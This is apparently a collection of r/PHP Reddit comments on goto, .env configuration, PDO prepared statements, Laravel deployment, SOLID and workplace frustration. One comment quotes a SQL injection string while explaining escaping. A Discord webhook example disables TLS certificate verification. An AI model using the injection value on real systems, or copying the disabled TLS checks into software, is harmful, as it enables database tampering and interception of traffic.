I'm sure it's not documented anywhere, mailing list or otherwise. And I'm sure it's probably not the *only* reason `goto` was added, but I believe it helped influence the decision. I'm not trying to sound sexist, I think they had good intentions. But the community was, largely, against adding it. The language already had a bad reputation due to poor programming habits and this was just adding fuel to the fire. There was really no reason to add it, other than it was something "fun." On the PHP Cruise in 2004, specifically, I remember this girl was there by herself and everyone was unintentionally ignoring her, nobody knew she was there for the conference and nobody bothered to ask. She just didn't look the type, ya know? But once someone figured it out it was a big deal, and became a topic of conversation that they needed to work on diversity. So, I believe it was a strategic move. They wanted women more involved and to have a bigger voice. That is my impression. Sorry if I've chosen a poor choice of words.
Yeah. I was being sarcastic. That whole website reeks of low quality 
I always hear this but what is the best way of organizing logic?
I'm guessing the author is trying to say "Best PHP Framework for intermediate developers". Intermediaries is something else entirely.
[MVC in simpler terms or the structure of a modern web-application](https://phpdelusions.net/articles/mvc)
Like it is here? https://symfony.com/doc/master/bundles/FOSUserBundle/index.html
The article itself says its not safe lol
Changelog: https://github.com/php/php-src/blob/php-7.2.0RC4/NEWS Upgrade notes: https://github.com/php/php-src/blob/php-7.2.0RC4/UPGRADING
Put in separated classes. Good free book, how to structure your project: https://www.reddit.com/r/symfony/comments/1lqm5r/symfony_2_book_a_year_with_symfony_by_matthias/ althought it shows with symfony, but you can easily adopt in laravel.
Exactly, it should be removed from there.
Yes there are other ways to solve this issue, but in this case, a goto is less code and it is pretty clear. 
Sad to see Netware finally go as a supported system.
Environment variables are better than configuration files because they're "outside of code" (whatever that means) and language-agnostic, but managing environment variables is hard so create a configuration file called .env with the variables in it and use a third-party library to read it. This doesn't make sense to me, why is .env different to eg. a yaml file (which is also language-agnostic)? They also gloss over this point, but then go on to say a configuration file is necessary anyway, I hope people who use .env are thinking about permissions on this file too...: "The alternative is plain old text files, with strong Unix permissions."
🔥
Really it is very helpful.
YAML might be language agnostic but the whole point of ENV variables is that they don't have to be parsed by PHP. This is rarely how YAML works in PHP from what I've seen. At best it's transpiled into PHP in some cache dir before being loaded. ENV, on the other hand, is compatible with [Docker](https://docs.docker.com/compose/environment-variables/), [Apache](https://httpd.apache.org/docs/2.4/mod/mod_env.html#setenv), and so on. These are then accessible in `$_ENV[$name];`or `getenv` (Most) PHP starts and exits dozens, maybe hundreds, of times for a single user using a single application. Parsing the config on every invocation is wasteful. ENV speeds things up. 
Use git-crypt: https://github.com/AGWA/git-crypt 
I don't think that's necessary. Git is for source code. Source is not account-specific and in many cases isn't (or shouldn't) be deployment-specific.
I used goto once when I was debugging a horrible massive script that kept crashing my IDE. Nobody died, but I didn't commit the code with the goto in, so that might be why
Did you buy that joke at the discount comedy store?
I have ~40 production netware severs still!
Did you buy them at the discount server store?
Yes, but if they're then put into a configuration file called .env that isn't necessarily compatible with all systems. You're then left putting them in the each system's config as required which is argued against in the article because it's basically too much hassle. I'm not arguing against environment variables really, I'm just saying whether you use them or not you're still going to be putting your variables in a configuration file which you should be securing. I just don't understand the premise of the article: "configuration files are messy, you can instead use environment variables and then use a library to read a configuration file to import your environment variables". &gt;(Most) PHP starts and exits dozens, maybe hundreds, of times for a single user using a single application. Parsing the config on every invocation is wasteful. ENV speeds things up. Aren't the libraries like dotenv doing exactly that though? The only difference seems to be that the variables are accessed in a different way. I agree with you if the env variables are defined in, say, FPM though, although wonder how significant the difference might be.
Probably because he knows who Rob Allen is. You should know who Rob Allen is.
&gt; Edit: Oh, don't use Mongo as your primary database. Ever. Why is that? I've never used MongoDB as MySQL fits all of my database needs, so I'm just curious.
Can you please share with us how do you find interesting people like Rob Allen to know about?
Sure; I have these as part of my "daily reading": - https://www.phptoday.org/ - https://planet.nomadphp.com/ - http://www.planet-php.net/ - http://www.phpdeveloper.org/ And of course the regular Twitter scroll. There is some overlap between them, but each tends to have at least one thing the others do not. 
Yep.
The only use-case for 'goto' is to be used as an example of how bad code can be written. 
Less code than a single break statement?
I know how `goto` works, but I haven't run into any cases where the performance gain would be helpful enough to negate the principle of least astonishment.
Tanks you!
Keep practicing until astonishment disappears.
That's the ~~Code Igniter~~ Laravel way.
BRING THEM
`PHP artisan serve` is just for testing. Laravel doesn't need SSH access. The machine you're hosting at has its own HTTP server probably Apache or Nginx, do more Googling and you'll figure it out.
Am I actually being that special? I'm not even new to PHP, but i'm super fresh to PHP frameworks. Thanks my man
IMO, that the extension allowed users to use it poorly *is* a vulnerability. If a safe let's you use a 1-digit password, that's a vulnerability with the safe.
Just Upload all your projects's files to the server. Then go to the domain settings of your hoster. And chose the "public" folder of the app as entry point. That's it.
Better to use 5.6 if it's an old system, no? If it's a new system, you shouldn't be using mysql_ functions
That's a better phrasing, but your example is against you. Following its logic, mysqli is *equally* vulnerable (as it's still allows, so to say, "1-digit password") and, following the overall sentiment of this thread, should be banned as well ;)
Read the PDO manual on the PHP docs, and also look up `PDOStatement::bindValue()`.
Using mysqli_ is *less* vulnerable than mysql_ (and PDO, because it also has functions where binding isn't necessary), because it allows users to use prepared statements. With mysql_ you have no choice.
PDO uses parameterization on the MySQL client level to avoid creating SQL statements on the fly. This bypasses the risk of having to sanitize your own inputs against harmful SQL code. It does not mean you don't have to verify and clean your own inputs, however, and you should still never trust user supplied inputs.
As a DevOps with a high focus on security, ENV are the least secure way to provide secrets to your app. Do not use them for such. ENV variables are easily exposed to any process that wants to sniff them out. Docker for instance has created a Secrets component to use with their swarm, and AWS has Parameter Store. You can even use a secured, locked-down S3 bucket to store/read your paramters, and use IAM to gain access to them. This can be slow, but you can back it with an in-memory cache.
/r/phphelp is the forum to ask for help on as far as I know. PDO doesn't just magically prevent SQL injections. You should read up on "prepared statements". It works by not concatenating the values you want to insert into the query itself, but in a placeholder. Basically, you do something like $stmt = $pdo-&gt;prepare('INSERT INTO table (column) VALUES (:my_value)'); // my_value is a placeholder $stmt-&gt;bindValue(':my_value', $unsafe_var); // We assign a value to the my_value placeholder. $stmt-&gt;execute(); And then you can be sure that my_value is treated as a single string value to be inserted, it's now safe. 
goto: 4 break: 5 20% savings.
Sorry, I am not sure I got your phrasing correct. Regarding PDO, are you saying that Mysqli is less vulnerable than PDO, because PDO has functions where binding isn't necessary? 
I'm not sure where to post this as it's not exactly a pure PHP question but I figured this would at least be a good starting point to get an idea if I'm just missing something. When trying to build a scalable environment where the DB server is decoupled from the nginx/php nodes, I'm noticing a significant increase in runtimes when you go from a local development environment where the DB is essentially on the same machine vs a remote machine even when there is nearly no latency between the two machines. I've even rebuilt the two environments are nearly identical with the exception of how the app connects to the DB and the runtime difference is still there. We've even gone so far as to try and remove every bit of overhead like removing DNS lookups and what not from the equation so we're dealing with as close to a direct connection as possible. However even with all that optimization, a process that runs in seconds can take minutes on the decoupled environment even with a shared PDO connection throughout the app to reduce the creation of multiple connection objects. I'd expect some difference just because of the communication overhead, but this is a significant difference. I wondered if anyone had any suggestions where I might be missing something or point me in a direction I'm not considering?
I think by default, PDO creates the Query with all placeholders filled out by itself. You have to set ATTR_EMULATE_PREPARES to false if you want to SQL Server to do that. But I really have a problem with this "clean your inputs" mentality. There's nothing unclean about a string like *'); DROP TABLE table;--*, and thus no magic way to make it "clean". It all depends on where you want to use it, and THAT'S where you should escape it. If you output it as html, htmlspecialchars (Or better, use a templating engine that escapes automatically). If it will be included in an SQL statement, use a prepared statement, or if it's something like a table name, use the vendor specific escape mechanism for that. Or maybe if it's a program argument, you use escapeshellarg. But never just escape "just in case". How are you supposed to know where you're going to end up using the value?
Improved e-commerce for dead CMS's?
Why wouldn't you create the user on your system.. and keep track of who you are emailing and when. Why would you want a third party email service to maintain that ? I mean yea they could.. but their business is sending email. 
Well, to be strict, PDO actually works both ways, and for MySQL, for example, by default it if creating SQL statements on the fly. This behavior could be switched off, though
Like everyone else just said, it is not just PDO but prepared statements that make your database interaction safe. I just have to add that PDO prepared statements are not that boresome as it seems. Binding each value using bindvalue() is not necessary. It's especially good for PDO that it allows very neat prepared statement operation, making safe code as concise as your unsafe one. Let's take your case. According to the [INSERT query PDO example](https://phpdelusions.net/pdo_examples/insert), it can be written in one line $pdo-&gt;prepare("INSERT INTO table (column) VALUES (?)")-&gt;execute($_POST['user_input']); As you can see, it's even shorter than your mysql_query example. 
php 7.2 includes nullable types? 
I thought standard practice was to place your config files outside of your programs main folder with only read access. Is that different now?
Mmm sure, I would've called it dead too, before receiving quite a few support requests for it (I work at the startup behind this post). Many clients still using it, some wanting to upgrade/start their e-commerce on existing sites. Value for them and maybe others, even though it ain't as sexy as our SPA, JAMstack, headless stuff. :)
Are you referring to my "whatever that means", comment? It probably wasn't necessary but I've seen people describe code and configuration as separate, and here configuration apparently counts as code... End of the day, an arbitrary definition of what constitutes code isn't relevant. I guess it's described that way to illustrate the idea though. Yeah, keeping environment specific stuff and passwords out of the main code folder makes sense though. 
Laravel works for your hosting. You just don't know how to integrate it
If it is possible choose another hosting. You don't need to (must not) use `php artisan serve`, but I image that you are using migrations, ...
I guess the drush folks finally got too far behind updating their code base to do what drupal console is doing and keeping up with the recent 8.4 release. /endSnark This actually seems like a decent tool/work around to try out, I've only really run into this issue once though so I'm not sure how I'd go about playing with it in a real world scenario.
It sounds just as good as composer bin plugin. What makes cgr better compared to composer bin plugin (other than cgr adding a namespace for each global dependency)?
I want to leverage their analytics and everything that comes advertised with these services because it will save me a hell of a lot of code so I don't have to track things like opens and unique clicks.. etc..
&gt;Are you referring to my "whatever that means", comment? Yes, outside of code variables were standard practice from when I last read about this subject, I was wondering if anything changed. &gt;Yeah, keeping environment specific stuff and passwords out of the main code folder makes sense though. I'm just confused on why someone would use environment variables instead of regular variables? is this for CLI? The article spouts more security, which isn't bad, but outside of scope variables only accessible by the program itself has been sound. 
It's a good plugin although I tend to prefer https://github.com/bamarni/composer-bin-plugin which unlike cgr makes it easy to keep track of your tools at a project level.
The core value of environment variable management, or configuration management, is the ability to change global settings for a particular deployment of the application, in other words the ability to test things in a development environment and not mess up the production environment. This is easy to understand when you look at code dealing with 3rd party APIs. Say you are building a module that feeds data to PayPal, and you want to do a full test that includes the actual PayPal process, but since this is only for testing you want to configure it to use development credentials and use PayPal's development sandbox. And at some point you will need to switch those credentials and those access points to the production version. That is when you discover the value of something like a .env file paired with a .env.dev file (your local settings that are not in the repository).
Honestly, I don't think it matters whether they're environment variables or not, as long as you secure them from potential threats. 
lol it was downvoted by a bitter amateur who apparently fails to write clean code and has no desire of learning how to write it. 
TBH, I feel like CMS platforms are only dead/dying to the developer community because said group has the resources or client base to build with the latest cutting edge stuff, whereas the CMS marketspace I feel like is inherently geared toward a lesser-technical market that might not be able to code it all on their own but may be comfortable enough maintaining a system thrown together with random bits and pieces while hoping for the best. Being on Joomla's dev team I'm saying that, and I've also used a few of the other PHP CMS's and looked at even more. So CMS's (especially the big three) might be dead to a lot of developers but for the non-techie folks they still have a market space, and that's why things like this still have a spot in the 2017 marketspace.
Can't say I disagree.
I never put it in production code, but I have used it for debugging. I recently switched to PHPStorm so I don't think I'll really need to again. But essentially I used it in cases where I needed to jump through a lot of logic, without disabling it all. But again, I have never utilized it in actual releases.
I suppose, but the thing is even talking about CMS's WordPress kind of rules. Of all the sites of worked on, only one client ever used Joomla, and wanted to get away from it ASAP. I've worked on plenty of WP websites where the customer was content with it.
I just ran into issues trying to get phpunit 6 &amp; phpdocumenter 2 to play nice together.
TBH I didn't know composer bin. cgr is an easy acronym for composer global require: `cgr phpunit/phpunit:^6` `cgr "phpdocumentor/phpdocumentor:2.3.*"` and It's all good from there. composer bin looks a bit more sophisticated.
username checks out
Lumen is simple enough for APIs working with JS?
do you know any example of it working with react and as a WebApp? With custom urls?
Have you tried Google? I just googled it and the entire first page was github and YouTube examples 
Just pay a few dollars a month for a hoster that isn't shit.
Ya but not really anything thats exactly what I have described. Unless you can provide otherwise?
It has to be hosted on University servers so I don't have a choice
In that case i'm not sure I fully understand your needs, sorry.
Only used Mix and Tinker and even those do not feel essential.
But where than keep secrets for S3 bucket access for example?
That's simply the bad developer way, doesn't matter what framework it is.
laravel powered practices
I'm the author. Have been working on this for few years now, but never really published. Here are other links: - For hard-core PHP guys: https://github.com/atk4/data - CRUD, Grid, Form etc: https://github.com/atk4/ui, also demo here: http://ui.agiletoolkit.org/demos/ If my work is interesting, I can share more. Have a nice day!
That reminds me of my university... WebDAV over VPN. You could try to adapt your Laravel CLI tools to be usable through HTTP requests. TYPO3 does this - the CLI and the "installer" (just some website really) are two frontends on top of some abstracted code execution. Like clearing the cache, analyzing permissions etc. I wouldn't be suprised if someone somewhere in the web did this already.
swagger have codegen, but as far as I remember it generate native javascript.
You can do that just using the email address.. which they get when you send an email. I use SendGrid personally.. but I suspect they all offer similar features. I manage my users in my own backend.. I only use SendGrid to send emails. 
Thanks, I like to cringe.
&gt; I'm the author. Have been working on this for few years now, but never really published. You should, because without feedback you risk the project turning into a complete acid trip. Feedback from reality is the healthiest way to creating a useful library/framework/component.
It's inconvenient to download archive files, can you please publish this on Packagist?
You don't. You use IAM Roles.
LOL, I suffered that same problem as you did. Laravel tutorial made me believe that you need vagrant, homestead, etc... when you didn't at all. It was only "best practice" show case. Just go to laravel git, download the zip file and extract it to your www like you'd normally would any index.php file. Trust me, it'll work. Save yourself some headache. You could always learn about vagrant, homestead, etc... later on.
&gt; Aren't the libraries like dotenv doing exactly that though? Unavoidable unless they're being loaded by a parent process like a web server and *actually being used like environment variables*. * https://github.com/vlucas/phpdotenv/blob/master/src/Loader.php#L78 * https://github.com/josegonzalez/php-dotenv/blob/master/src/josegonzalez/Dotenv/Loader.php#L207 * https://github.com/symfony/dotenv/blob/master/Dotenv.php#L48 I think our friendly author has been misled, is sleep-deprived, or wanted to make a subtler point that we've all missed. Of course the .env file is being parsed. What the heck is this article about?
They lost me at the `.env` CONFIGURATION FILE. Look folks, you can put lip stick and a wig on a pig, call her Mrs. Piggy, and teach her karate. It at the end of the day, she's still a pig. Now if you'll excuse me, I have an inexplicable craving for bacon. 
Probably makes more sense to do it in JavaScript unless you need to log stuff. You can get the user input as variables using jQuery or whatever, and then just find the equiv. Math functions to your existing formula.
&gt; Give me any class at all, any class and I can instantly figure out a way you're "violating the single responsibility principle". Well, that's just clearly not true: class IntAdder { public function add(int $a, int $b): int { return $a + $b; } } Developers all too often conflate patterns, groups, themes, and other commonalities with responsibilities. Creating classes based on what/how things *are* instead of what they should *do* is the easiest way to violate SRP, and similarity is not how you define responsibility borders. Laziness compounds this problem, as well ("N classes would be superfluous/unnecessary!"). Plenty of people find SRP to be subjective, but the underlying reason is invariably a misunderstanding about what "responsibility" actually means. &gt; The same applies to the "Interface Segregation Principle" which is just "single responsibility principle for interfaces", and I suspect Bob Martin threw that one in so he can make SOLID a nice acronym. Violation of ISP quite often reveals underlying violations of SRP in classes that implement the offending fat interfaces, but that's about the extent of their connection or similarity. ISP is about ensuring that code isn't requiring things it doesn't need, and the ensuing problems that that gives rise to. That's not what SRP is about, at all. &gt; First, if you're the average developer you can't tell the difference between Dependency Inversion and Dependency Injection. Ignorance is a poor argument against the appropriateness of a principle. &gt; Second, it's literally impossible to write a useful piece of software where every dependency is inverted. Violation of DIP doesn't boil down to whether or not every single dependency in a piece of software has been inverted. DIP only applies to code that needs to be (or would benefit from being) decoupled. That clearly isn't *all code*. &gt; And when we agree what it is, we realize the original definition (involving inheritance) is absolutely outdated and irrelevant to the modern OOP practices. The definition hasn't changed at all. Its application has changed with the shifting practices of OO design over time, to be sure. However, the concept, and its benefits/drawbacks haven't wavered. &gt; You're unlikely to either open everything for extension, or close everything for modification. It's always a balance brought forward by requirements and experience. OCP doesn't apply to everything; only code which needs to be extensible. If your code needs to be extensible, it should be made so in adherence to OCP. This principle is about *how* extensibility manifests itself, not whether or not it does. &gt; So. Bottom line. To say "not adhering will definitely guarantee it to be bad" is to demonstrate how little you understand about how contextual and subjective these rules are. &gt; I said, rules are for the guidance of wise men, and for the obedience of fools. The irony being, you're likely not even sure what exactly you declare you're obedient to. I don't appreciate the unnecessary personal attacks, especially since your responses made clear that your opinions of me are tainted by some pretty fundamental misunderstandings on your part about when and how the SOLID principles should be applied (and therefor, what constitutes violations/non-adherence of them).
goddammit I want my motherfucking pipe operator
I think you’re thinking about this the wrong way. You should treat the PHP app as a separate application and write a React app that uses the PHP backend via RESTful APIs. You’re not going to get much benefit out of React if all you want it for is to run JS in an old-school request/response paradigm. 
The thing I cannot understand while looking at all those libraries is the following: if .env files are only recommended to be used for development (otherwise, they are not different from config files), why all the libraries require adding their initialization to production code? And furthermore, the article suggests adding a condition to disable the library in production based on env. What would look more natural, is that once a library is registered as a dev. dependency, it picks up the env. file and populates superglobals accordingly. So your production code interacts with the globals and doesn't depend on _any_ .env library and the file itself. Am I missing something?
This looks very interesting and I'm going to mess around with it tonight. It could be a neat little solution for my admin dashboards. With your agile/data package, is it possible to create models around existing databases? For example, my frontend website uses Propel ORM. Can I work with something that already exists or does this framework require me to rewrite the schema/models from scratch?
Agile Data is designed to fit around any database structure (SQL/NoSQL). It has been growing in popularity slowly on its own, it's a new design. The design is a much needed refresh from an ORM paradigm and you'll find it more "declarative" then conventional ORM. It's more optimized for high-latency cloud databases and helps your application perform less queries and transfer less data. Also fully compatible with API backends making it good way to migrate your entire app to micro-services when you are ready. Agile UI is mostly an "out-of-the-box UI" for Agile Data. My next project is to build out-of-the-box RestAPI for it to connect to frontend JS frameworks. It's also thanks to Agile Data metadata that makes it possible to create 2-line CRUD only UI. So to answer your question - no, schema can remain as-is and yes, you would need to create models, but that would be very fast and simple.
Our application uses config files. We have a config.php that is outside of git and a config.default.php which exists in git. The two files must have matching indexes otherwise an exception is thrown. I find this useful because it does the following: - keeps sensitive information outside of the repository - maintains the types of configs needed inside the repository
You should read what everyone else has written, but also this: https://phpdelusions.net/pdo
I don't see how PHP would be better than Excel at this. Why does it take so long in Excel?
Hi. Conventional PHP frameworks would get in your way wanting you to learn HTML and stuff. I have developed an easier way how to do what you want, here is step-by-step: 1. http://agiletoolkit.org/ - download and install. If you are on a Mac, just double-click an app. For Windows/Linux you'll need XAMMP. 2. Once you see the hello world example on the screen, open "index.php" in any editor. Get rid of the code below the comment and add lines: ``` $form = $app-&gt;add('Form'); $form-&gt;addField('num1'); $form-&gt;addField('num2'); $form-&gt;onSubmit(function($form) { return 'Result is '.($form-&gt;model['num1']+$form-&gt;model['num2']); }); ``` 3. Refresh your browser, you should see a form, input 2 numbers, push a button and PHP will add them up for you. 4. Gradually add more fields and make your formula work. Refresh browser after you edit the script. 5. Once happy, register with heroku.com end deploy your app for free, share with your friends. I hope this helps! If you find documentation difficult, ask away in the chat room: http://gitter.im/atk4/atk4
Man, I love PhpStorm. I switched from Atom.io yesterday and it's a godsend.
You should try reducing number of queries to the database, which is a common problem. Depending on the framework/ORM/App you use they may be doing some heavy querying. On a side note - I have developed a data access library specifically for high-latency databases (like in your case), check it out: https://github.com/atk4/data. 
thanks mate
So what to do? Can you point me in the right direction?
I'm exercising in DDD/OOP, here's my [JSON API implementation in php 7](https://github.com/json-api-php/json-api). Critics and contributions are welcomed.
Any text variant? Videos are useless unless you have sound 
Tools &gt; Tasks &amp; Context &gt; Load / Save / Clear Context
And what does it do?
Context contains open folders in explorer and open tabs in the editor. Guess it could be useful when working on different things in the same project.
Ah okay, I'll pass on that one, opening a bunch of files and you lose you context anyway, so imo it's kinda pointless
The way I see it (and use it) the .env file is only used in development. In production it is not used. 
I disabled tabs a long time ago, i use recent files for fast switch between two files and file fuzzy searching. Never going to tabs again.
Apologies, no. What I mean was that PDO and mysqli_ are equally vulnerable (as far as this case goes) because they both *allow* non-prepared statements. But they're *more* secure than mysql_ functions because that *only* allows non-prepared statements. I mean, used correctly they're all equally safe. They problem is that you can't keep out the shit-munchers and mysqli and PDO aide that a bit by providing safer alternatives.
This is a deployment problem, not a PHP/Laravel problem. You don't need `php artisan serve`. In fact, I don't think you supposed to use it in production. Serve your site with regular, reliable, old apache. Also, it's important to note, Laravel is regular old php. The artisan file is just a php file without the extension that plugs into the framework.
Huh?
How do I build a webhook for didcord in php?
 $text1 = "some string"; $userContent = "some other unsafe data"; //discord $discordBody = ".-.-.-.-.\n"; $discordBody .= "**New Messagel**\n\n"; $discordBody .= "*Label*: $text1\n"; $discordBody .= "*Description*: ".htmlentities($userContent, ENT_QUOTES, "utf-8")."\n"; $discordBody .= "[Link Title](https://google.com)\n"; $discordBody .= ".-.-.-.-.\n"; $discordMessage = array( 'content' =&gt; $discordBody, 'username' =&gt; "Metavulp Bot", 'avatar_url' =&gt; '' ); $data_string = json_encode($discordMessage); $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, 'https://discordapp.com/api/webhooks/&lt;your hook id&gt;'); curl_setopt($curl, CURLOPT_POST, 1); curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json')); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_POSTFIELDS, $data_string); $output = curl_exec($curl); if (curl_getinfo($curl, CURLINFO_HTTP_CODE) != 204) { die('Caught exception: ' . $output); //or some logging function } curl_close($curl);
Hi, thanks for your response!! For storing secrets I'm thinking about Vault. But I face the same problem, where to keep secrets in application server for accessing Vault, because we are not on any cloud.
Yeah it is really good. But saving context saves where you are in the in the file which helps. More importantly it saves the files you were working on. In larger projects, with a lot of files, sometimes files share the same name. So saving context does help getting up the files you were working on. Then you can use "Ctrl + tab" to cycle through. I have found it quicker to do this. With Fuzzy search you will have think twice. 
/r/PHP is not a support subreddit. Please visit /r/phphelp for help.
If you didn't already know, CTRL - W is a big productivity booster -&gt; example: https://twitter.com/HelgeSverre/status/916198399468240897
&gt; &gt; Give me any class at all, any class and I can instantly figure out a way you're "violating the single responsibility principle". &gt; Well, that's just clearly not true: &gt; class IntAdder { public function add(int $a, int $b): int { return $a + $b; } } Well, this class is *clearly* in violation of the Single Responsibility Principle. What do you think "oh it's short, so it's single responsibility"? That's just lack of experience talking. There's such hard coupling of unrelated ideas here, and very low cohesion. Let me remind you of Bob Martin's definition: "one responsibility = one reason to change". Just look at how many reasons to change this class has: - If the integer abstraction changes (say arbitrary precision math), this class has to change. - If the operation changes (say subtraction), this class has to change. - If the number of operands changes (say unary or ternary operators), this class has to change. You should start with class OperandList, and interface Operation that accepts OperandList instance, and an OperatorSelector to choose the correct Operator implementation based on the Operand types and we can start talking about *untangling that mess up there*. **/s** And while I'm kidding, that's *exactly* the kind of discussions the vague language of SRP leads to. It's a useless reinvention of the "Separation of Concerns" principle, which puts the focus back on human communication, human comprehension and context. While SRP pretends as if "responsibility" and "reason to change" is possible to analyze in the abstract without the *exact context* the code is used in. Nope, it can't. &gt; your opinions of me are tainted by some pretty fundamental misunderstandings on your part about when and how the SOLID principles should be applied (and therefor, what constitutes violations/non-adherence of them). I can sum up most of your feedback to each rule in SOLID as "yes, I agree, this rule is not applied always and consistently, it *depends*". Well, I was also saying *it depends*. But *it depends* is not a clear rule a junior can apply in a non-ambiguous way in their work. You've said a lot of *words* above, but you've said little to support your conclusion that I have "fundamental misunderstandings". Sorry, but you can't Trump your way out of this. 
All you really need to do is point the web server's "document root" (where it looks for the files) to your public/ folder.
Also experienced this. You need to work in an environment where business and the development team do not directly communicate. The development team needs to have values like code quality, scale-ability etc and have to stick by those rules. If you are not in such an environment and are willing to do it for the money then so be it, with a burn-out as a plausible outcome. TLDR I suggest switching to a company with a better development environment and business model.
- For most server applications, put the secrets in a file outside your source code repository, and restrict its Unix permissions as much as possible so it's only readable by the right processes. - For high security applications you can consider a small daemon that stores the secrets encrypted at rest (means contents on disk are encrypted) and is initialized with a master password to decrypt the secrets in RAM from the command line (no environment vars), and serves secrets to local processes fitting a specific criteria (whitelist).
You need more people working with you. The problem you outlined here is very common: programmers in general are not good communicating with people. You need at least two more staff members to work along with: a support engineer and a promoter/teacher who would arrange learning sessions for the company stuff. At out company we are utilizing this very scheme: core programmers are never touched by customers (either external or internal ones) but only a support engineer confronts them, either solving the problem by himself or setting a ticket in a bug tracker for the core programmers. And also we have a nice teacher whose responsibility is to create the help site, to arrange seminars ant learning sessions for the customers. 
What is also useful is a struct which exoresses a period as a start plus an interval. If you want to reschedule this you only need to adjust the interval, and it works better in the fave of end-of-month issues. 
I find however its way easier to do things like session/cookies with php, and to check if a user has access to a certain page or not first in php and decide what to do from there
Learn to say no. I get it.. you want to make everyone happy and if you work hard enough at it you can find some solution that will. But it's not worth it, because I can tell that your efforts are not appreciated, and they're just going to demand something else just as stupid as soon as you're done with it. I've told the CTO of multimillion dollar companies straight up "I'm not doing that because it's a bad idea. You need to train your users how to use this, and then force them to use it correctly." As a consultant, I don't actually say "no" that often unless it's a really bad idea. My answer for most things is "We can do anything you want with enough time and money." Since I started consulting, I rarely say "no" outright.. I just give them an insanely high quote. Simple Wordpress site with a few custom Content Types? $10K to start. I hate Wordpress, but it's a goddamn joy to work on when you're going to make $1000/hr if they say yes. If you're an employee, you probably can't work with your pay like that.. so work on the time. They want a feature you think is stupid but will only take you an hour? Tell them it will take a day. Bang it out, and then work on something you enjoy for the rest of the day. You'll start to look forward to those requests because it means you've got time to do what you want.
Amen to that. Hopefully, not all projects are the same, and not all goes this way. If you're lucky enough or smart enough not to choose working in a company with bad project managers, this work can actually be real fun and those kind of client be reasoned by your project managers. This can only work when people care about each other and do see the reason there is in compromise and small steps.
You got some great advice already. I would just like to add my .02$. Since you developed this nice engine and you can solve most of the problem by creating custom rules why are you having an issue implementing requested buttons? If you are getting payed by the hour this is a great opportunity to charge for extra functionality with little work. If you are not payed like that, maybe it's time to change jobs. Regarding the "it should work like an Excel", other than saying just use Excel, a better argument would be that Excel has been decades in the making with a budget and man power that far exceeds your constraints. The main issue you are having is that people do not want to learn new things and are pushing back on the new software because it adds a lot of strain on them mentally. For them this is just more work they need to do for the same pay and they have been trained to use existing workflows already. Changes like these have to come from the top. If the management does not get everybody onboard and you do not have their support this will just continue to stress you even more. 
The issue is not implementing the buttons. The issue is that adding 100 buttons on a page is disgusting and is basically a way of admitting they are too stupid or lazy to take 5 minutes to learn how to utilize a superior alternative that is already implemented.
Have you tried to stand your ground and simply say no to ridiculous demands?
&gt;So I created a stupid-easy to use "ruleset" system, basically allowing people to create conditional statements for automation and filtering Wow, you're amazing, dude. Why didn't you just use [ExpressionLanguage](https://symfony.com/components/ExpressionLanguage).
Please read the chapter on the rowCount there.
You are being idealistic and only seeing the things from your point of view. On the other hand, if a user wanted a button, and not a state-of-the-art ruleset solution, then maybe your solution wasn’t superior? Yes, they probably are too stupid *and* lazy. You can either work against it, try to change it and get frustrated or embrace it. The hard thing about programming isn’t algorithms, data structures, design patterns and stuff. It’s the human-computer interaction. 
Magento isn't terrible but prob a bit much for an entry-level dev.
You may want to read "The Clean Coder", which talks about how to tackle situations like these in a way that doesn't bring you down. Other than that I agree with the rest of the comments: learn how to say no, have a team that supports you, work for a company that understands developers. It may not be possible directly, but at least at the next company you apply for, you will know what questions to ask!
&gt; You need more people working with you. This. A million times this. The following may feel offensive to you, but it isn't meant to. The challenge lies in communication. From your story I get the feeling that you are the only developer working on the CRM, while every user has a saying in how things should work in your CRM. The CRM you created is your little baby and you are very proud of it, which is totally fine. I've worked as a developer for over ten years. Currently I'm in the position where I'm the link between the rest of the company and the developers. Many, many times I've been in a situation like you described. I've had so many discussions with users about functionality which I created and seemed fine for me, but for the user it was totally unusable. It made me feel offended, because after all, I was the one who created it and I was very proud of it. How dare they to doubt my superior ideas. What you need is someone to be the link between you and the users. Someone who stand their ground and dares to say no every once in a while. Someone who knows how to communicate with a developer. He or she should be the endpoint for communication about the CRM. He or she should then communicate with you, so you can both rant about the users and come to a solution, so you can spend your time developing the CRM and not losing negative energy in endless discussions about feature X. From what I've learned over the past decade, is that communicating with a developer is hard and requires a mindset that a lot of people don't have or are not willing to develop. And some users are jerks and are not willing to change. Unfortunately it's quite hard sometimes to distinguish a jerk and a user who isn't happy. 
This isn't really a problem with programming... it's just a problem with humanity itself.. if you were a carpenter or a waiter or a cook or a gardener or whatever you would still have similar problems ;) People loves to complain about other people's work
The point is that you can always return to the same context with "load context". I don't use it myself, but if you work heavily component based, it might be quite useful to have a context for each component, so you can easily and quickly jump between them.
My ruleset logic used a total of about 100 lines of code. Laravel does the rest. So I didn't exactly reinvent the wheel, I just chose not to use a monster truck tire on a Chevrolet Cruze. Good job making the Symfony community look bad, though.
It kind of sounds like you programmed something without FIRST getting any sort of (user-interaction) design work done or actually doing some requirements engineering with the relevant users and decision makers. These things are always a two-way street and you're clearly not communicating enough. And on top of that, your post is just written extremely arrogantly, you seem to think everyone around you is a complete moron, which just reeks of that stereotypical "IT guy at the company that's always an ass to everyone" stereotype. Get down from your high horse, don't take criticism of your application personally and start working with people sooner rather than later. &gt;One individual explained how it SHOULD work, and then immediately afterwards, another individual described a solution that is the exact opposite. They both literally asked me to implement a solution with two completely different outcomes, while expecting me to please them both at the same time. And if people make different suggestions, why don't you simply point it out and say to both of them "Hey, your decision is exactly the opposite of what X said, can you guys try and find a common ground and then we can talk about a solution that would make you both happy" and then you move on like any normal adult human being instead of flipping out about it anonymously on reddit? &gt;After I showed them how to click the button, they told me that they wanted all the features and capabilities of Excel, but didn't want to have to export the reports to Excel. They basically wanted Excel recoded in PHP and implemented in the reporting section of the app. So what? They're not programmers, how do they know that it's ridiculous what they are asking, don't be so freaking arrogant and think that just because something is clear to you that it is clear to everyone. Again, just freaking COMMUNICATE. Calmly explain that what they are asking is an incredible amount of work, so if they really wanted that feature, it would take some X manpower to get it done in X time, and if the company is willing to pay for that, then why not? Likely they will say that it's too expensive then and then you can find a solution with them that makes everyone happy.
Good point.
I'm not offended at all. I agree entirely. A mediator would be amazing.
